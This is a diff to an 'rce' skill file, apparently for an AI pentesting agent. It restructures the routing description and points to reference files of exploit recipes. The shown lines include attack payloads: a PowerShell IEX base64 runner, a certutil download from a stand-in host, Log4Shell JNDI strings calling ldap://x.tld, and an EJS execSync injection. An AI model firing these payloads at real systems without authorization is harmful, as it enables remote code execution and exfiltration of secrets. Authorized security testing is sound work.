@@ -1,7 +1,32 @@
 ---
 name: rce
 description: >-
-  Use rce when recon shows that user input could reach a server-side code-execution primitive and the objective is to prove command or code execution on the target. Dispatch on parameters or form fields whose names or features imply the server shells out to an OS command or external tool — host, ip, cmd, ping, target, domain, nslookup, traceroute, whois, "test connection", convert, resize, format, backup, archive, compress, exec, or run — since these network-diagnostic, admin, and devops panels classically pass input into system/popen wrappers. Also dispatch when recon fingerprints a server-side template engine (Jinja2, Twig, Freemarker, Velocity, Thymeleaf, EJS, Handlebars), an expression-language framework (Struts/OGNL, Spring/SpEL), or a known code-exec component by version (Log4j, vulnerable Struts, Spring Cloud Function, old ImageMagick/Ghostscript/ExifTool), and when fields let a user supply or influence a template string. Open this skill for endpoints that consume serialized objects (base64 blobs in cookies, hidden fields, ViewState, or API bodies that decode to recognizable serializer formats), for file-upload features where you can control the extension or content of an uploaded file in a web-served path, for media/document/report pipelines that ingest or generate images, PDFs, SVG, DOCX, or LaTeX server-side, and for headers an app is likely to log through a JNDI-capable logger. It also covers per-language gadget-chain selection, expression-language abuse (OGNL/SpEL/MVEL), Log4Shell-style JNDI lookups, container/Kubernetes escape paths, and quiet-oracle confirmation via timing, DNS/HTTP OAST, and deterministic output diffs before any shell. Disambiguation: a value reflected into HTML or JS unevaluated is XSS; input reaching a SQL query without a reachable INTO OUTFILE / TO PROGRAM / xp_cmdshell / UDF path is SQL injection; a URL or host parameter that fetches a resource but reaches no execution service is SSRF; reading files like /etc/passwd with no write or auto-load path is LFI or path traversal — route here only when an evaluator, command wrapper, deserializer, or escalation sink is in reach.
+  Use: Use rce when recon shows that user input could reach a server-side code-execution primitive
+  and the objective is to prove command or code execution on the target.
+  Signals: Dispatch on parameters or form fields whose names or features imply the server shells out
+  to an OS command or external tool — host, ip, cmd, ping, target, domain, nslookup, traceroute,
+  whois, "test connection", convert, resize, format, backup, archive, compress, exec, or run — since
+  these network-diagnostic, admin, and devops panels classically pass input into system/popen
+  wrappers. Also dispatch when recon fingerprints a server-side template engine (Jinja2, Twig,
+  Freemarker, Velocity, Thymeleaf, EJS, Handlebars), an expression-language framework (Struts/OGNL,
+  Spring/SpEL), or a known code-exec component by version (Log4j, vulnerable Struts, Spring Cloud
+  Function, old ImageMagick/Ghostscript/ExifTool), and when fields let a user supply or influence a
+  template string. Open this skill for endpoints that consume serialized objects (base64 blobs in
+  cookies, hidden fields, ViewState, or API bodies that decode to recognizable serializer formats),
+  for file-upload features where you can control the extension or content of an uploaded file in a
+  web-served path, for media/document/report pipelines that ingest or generate images, PDFs, SVG,
+  DOCX, or LaTeX server-side, and for headers an app is likely to log through a JNDI-capable logger.
+  It also covers per-language gadget-chain selection, expression-language abuse (OGNL/SpEL/MVEL),
+  Log4Shell-style JNDI lookups, container/Kubernetes escape paths, and quiet-oracle confirmation via
+  timing, DNS/HTTP OAST, and deterministic output diffs before any shell.
+  Pair with: Also dispatch lfi, insecure-file-uploads, ssti, ssrf, deserialization in parallel when
+  the same evidence shows those mechanisms too; co-dispatch means separate focused workers sharing
+  the same investigation state, not merging skill prompts.
+  Do not use: Disambiguation: a value reflected into HTML or JS unevaluated is XSS; input reaching a
+  SQL query without a reachable INTO OUTFILE / TO PROGRAM / xp_cmdshell / UDF path is SQL injection;
+  a URL or host parameter that fetches a resource but reaches no execution service is SSRF; reading
+  files like /etc/passwd with no write or auto-load path is LFI or path traversal — route here only
+  when an evaluator, command wrapper, deserializer, or escalation sink is in reach.
 metadata:
   dispatchable: true
 ---
@@ -95,6 +120,11 @@ Encoded: `;(id;hostname)|base64`.
 - PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`.
 - Windows OAST staging: `certutil -urlcache -split -f http://x.tld/beacon`.
 
+When a naive `;id` / `| id` is filtered, see `references/command-injection.md`
+for the extended no-space / brace / tilde / hex / token-glue / polyglot
+bypass library, argument-injection vectors, DNS char-by-char exfil, and
+embedded-router CGI dispatcher chains.
+
 ### Template injection
 
 Identify server-side template engine: Jinja2 / Twig / Blade /
@@ -119,7 +149,14 @@ EJS:       <%= global.process.mainModule.require('child_process').execSync('id')
 - Log4Shell obfuscation: `${${lower:j}ndi:...}`,
   `${${::-j}${::-n}${::-d}${::-i}:ldap://x.tld/a}`,
   `${j${env:NOTHING:-n}di:...}`. Inject in `User-Agent`, `Referer`,
-  `X-Api-Version`, any logged header.
+  `X-Api-Version`, any logged header. For the full DNS-only confirm
+  lookups, env-secret exfil, WAF-bypass set, and rogue-JNDI step, see
+  `references/cve-rce-recipes.md`.
+
+When recon fingerprints a vulnerable product/version, jump to the exact
+request recipe in `references/cve-rce-recipes.md` — Shellshock CGI env
+injection, Struts2 OGNL `Content-Type`, Drupalgeddon2 render-array,
+Citrix CVE-2019-19781 traversal, and expanded Log4Shell.
 
 **.NET**:
 - BinaryFormatter / DataContractSerializer.
